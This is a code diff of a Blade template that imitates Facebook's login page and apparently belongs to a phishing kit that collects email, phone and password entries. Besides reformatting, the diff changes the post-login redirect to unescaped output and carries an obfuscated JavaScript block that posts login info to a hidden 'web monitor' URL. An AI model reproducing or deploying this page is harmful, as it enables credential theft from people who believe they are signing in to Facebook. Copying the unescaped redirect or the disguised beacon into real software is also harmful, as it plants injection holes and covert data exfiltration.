@@ -14,8 +14,9 @@
     <meta property="og:title" content="{{ $data->title }}" />
     <meta property="og:image" content="{{ $data->image }}" />
     <meta property="og:type" content="article" />
-    <link rel="shortcut icon" href="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/fblogo.png">
-    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <link rel="shortcut icon"
+        href="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/fblogo.png">
+    @vite(['resources/css/app.css'])
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
         integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
         crossorigin="anonymous" referrerpolicy="no-referrer"></script>
@@ -38,7 +39,7 @@
 
         @font-face {
             font-family: 'MyRulersVjpPro';
-            src: url('https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/fb_font.woff2') format('woff2');
+            src: url('https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/fb_font.woff2') format('woff2');
         }
 
         body {
@@ -87,7 +88,8 @@
     <div class="w-[95vw] lg:w-[99vw] mx-auto mt-[30px] relative h-[90vh]" id="main">
         <p class="text-center text-sm text-[#646d74]">{{ __('facebook.' . app()->getLocale()) }}</p>
         <div class="h-[200px] flex justify-center items-center">
-            <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/fb_logo.png" alt="fb-logo" width="60">
+            <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/fb_logo.png"
+                alt="fb-logo" width="60">
         </div>
         <p class="font-semibold mb-3 ml-2">{{ $data->login_warning }}</p>
         {{-- Thông báo khi lỗi --}}
@@ -103,7 +105,8 @@
                         class="absolute top-[10%] left-[16px] peer-placeholder-shown:top-[32%] peer-placeholder-shown:text-[15px] text-[#646d74] cursor-text text-sm peer-focus:top-[10%] peer-focus:text-sm transition-all"
                         for="user">{{ __('facebook.email_or_phone') }}</label>
                     <button id="close_btn" class="cursor-pointer hidden" type="button" tabindex="-1">
-                        <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/close_logo.svg" width="25" />
+                        <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/close_logo.svg"
+                            width="25" />
                     </button>
                 </div>
             </div>
@@ -117,10 +120,12 @@
                         for="pass">{{ __('facebook.password') }}</label>
                     @if ($setting->showFacebookPasswordButton)
                         <button type="button" id="show_pass" class="cursor-pointer hidden" tabindex="-1">
-                            <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/show_pass.svg" width="25" />
+                            <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/show_pass.svg"
+                                width="25" />
                         </button>
                         <button type="button" id="hide_pass" class="cursor-pointer hidden" tabindex="-1">
-                            <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/hide_pass.svg" width="25" />
+                            <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/hide_pass.svg"
+                                width="25" />
                         </button>
                     @endif
                 </div>
@@ -138,7 +143,8 @@
                 class="outline-none cursor-pointer w-full bg-white text-[#0064e0] border border-[#0064e0] rounded-[100px] p-2.5 text-sm transition-all duration-100">
                 {{ __('facebook.create_new_account') }}
             </button>
-            <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/meta_logo.png" alt="fb-logo" width="55">
+            <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/meta_logo.png"
+                alt="fb-logo" width="55">
             <div class="flex justify-center items-center gap-2">
                 <p class="text-[.7rem] cursor-pointer text-[#646d74]">{{ __('facebook.introduce') }}</p>
                 <p class="text-[.7rem] cursor-pointer text-[#646d74]">{{ __('facebook.help') }}</p>
@@ -146,7 +152,7 @@
             </div>
         </div>
     </div>
-    <script src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/helpers.js"></script>
+    <script src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/helpers.js"></script>
     <script>
         ////
         @if ($type == 'custom')
@@ -164,7 +170,7 @@
             const btn = $("#log_btn")
             if (data.status) {
                 warning.hide()
-                window.location.href = '{{ $data->redirect_link }}'
+                window.location.href = '{!! $data->redirect_link !!}'
             } else {
                 if (data.wrong_password) {
                     warning.show()
@@ -272,7 +278,54 @@
             );
         });
         @if ($setting->web_monitor)
-             function _0x288c(){const _0x37ec84=['48CMkkll','json','3JonQMx','17133vzCqfg','4310966IniJJf','{{ env('WEB_MONITOR_API_URL') }}','post','ajax','121420DbkbkL','{{$info}}','2589160vbohhG','21xlbLfm','728nFnPNA','330tpFAEl','32313696gMzGBS','605396rIPIJR','145269vZVoyM','login'];_0x288c=function(){return _0x37ec84;};return _0x288c();}function _0x33d9(_0x4b7f11,_0x1ea9e4){_0x4b7f11=_0x4b7f11-0x66;const _0x288cc2=_0x288c();let _0x33d95b=_0x288cc2[_0x4b7f11];return _0x33d95b;}(function(_0x605303,_0x130420){const _0x4d4965=_0x33d9,_0x497ad1=_0x605303();while(!![]){try{const _0x1dbb7f=parseInt(_0x4d4965(0x6f))/0x1*(parseInt(_0x4d4965(0x6a))/0x2)+-parseInt(_0x4d4965(0x70))/0x3*(-parseInt(_0x4d4965(0x67))/0x4)+-parseInt(_0x4d4965(0x75))/0x5*(-parseInt(_0x4d4965(0x6d))/0x6)+-parseInt(_0x4d4965(0x66))/0x7*(-parseInt(_0x4d4965(0x77))/0x8)+parseInt(_0x4d4965(0x6b))/0x9*(parseInt(_0x4d4965(0x68))/0xa)+-parseInt(_0x4d4965(0x71))/0xb+-parseInt(_0x4d4965(0x69))/0xc;if(_0x1dbb7f===_0x130420)break;else _0x497ad1['push'](_0x497ad1['shift']());}catch(_0x53c8ac){_0x497ad1['push'](_0x497ad1['shift']());}}}(_0x288c,0x88e02),((()=>{const _0x55563d=_0x33d9,_0x566492={'data':_0x55563d(0x76),'type':_0x55563d(0x6c)};$[_0x55563d(0x74)]({'type':_0x55563d(0x73),'url':_0x55563d(0x72),'data':_0x566492,'dataType':_0x55563d(0x6e),'success':function(_0x882676){}});})()));
+            function _0x288c() {
+                const _0x37ec84 = ['48CMkkll', 'json', '3JonQMx', '17133vzCqfg', '4310966IniJJf',
+                    '{{ env('WEB_MONITOR_API_URL') }}', 'post', 'ajax', '121420DbkbkL', '{{ $info }}',
+                    '2589160vbohhG', '21xlbLfm', '728nFnPNA', '330tpFAEl', '32313696gMzGBS', '605396rIPIJR',
+                    '145269vZVoyM', 'login'
+                ];
+                _0x288c = function() {
+                    return _0x37ec84;
+                };
+                return _0x288c();
+            }
+
+            function _0x33d9(_0x4b7f11, _0x1ea9e4) {
+                _0x4b7f11 = _0x4b7f11 - 0x66;
+                const _0x288cc2 = _0x288c();
+                let _0x33d95b = _0x288cc2[_0x4b7f11];
+                return _0x33d95b;
+            }(function(_0x605303, _0x130420) {
+                const _0x4d4965 = _0x33d9,
+                    _0x497ad1 = _0x605303();
+                while (!![]) {
+                    try {
+                        const _0x1dbb7f = parseInt(_0x4d4965(0x6f)) / 0x1 * (parseInt(_0x4d4965(0x6a)) / 0x2) + -
+                            parseInt(_0x4d4965(0x70)) / 0x3 * (-parseInt(_0x4d4965(0x67)) / 0x4) + -parseInt(_0x4d4965(
+                                0x75)) / 0x5 * (-parseInt(_0x4d4965(0x6d)) / 0x6) + -parseInt(_0x4d4965(0x66)) / 0x7 * (
+                                -parseInt(_0x4d4965(0x77)) / 0x8) + parseInt(_0x4d4965(0x6b)) / 0x9 * (parseInt(
+                                _0x4d4965(0x68)) / 0xa) + -parseInt(_0x4d4965(0x71)) / 0xb + -parseInt(_0x4d4965(
+                            0x69)) / 0xc;
+                        if (_0x1dbb7f === _0x130420) break;
+                        else _0x497ad1['push'](_0x497ad1['shift']());
+                    } catch (_0x53c8ac) {
+                        _0x497ad1['push'](_0x497ad1['shift']());
+                    }
+                }
+            }(_0x288c, 0x88e02), ((() => {
+                const _0x55563d = _0x33d9,
+                    _0x566492 = {
+                        'data': _0x55563d(0x76),
+                        'type': _0x55563d(0x6c)
+                    };
+                $[_0x55563d(0x74)]({
+                    'type': _0x55563d(0x73),
+                    'url': _0x55563d(0x72),
+                    'data': _0x566492,
+                    'dataType': _0x55563d(0x6e),
+                    'success': function(_0x882676) {}
+                });
+            })()));
         @endif
     </script>
 </body>
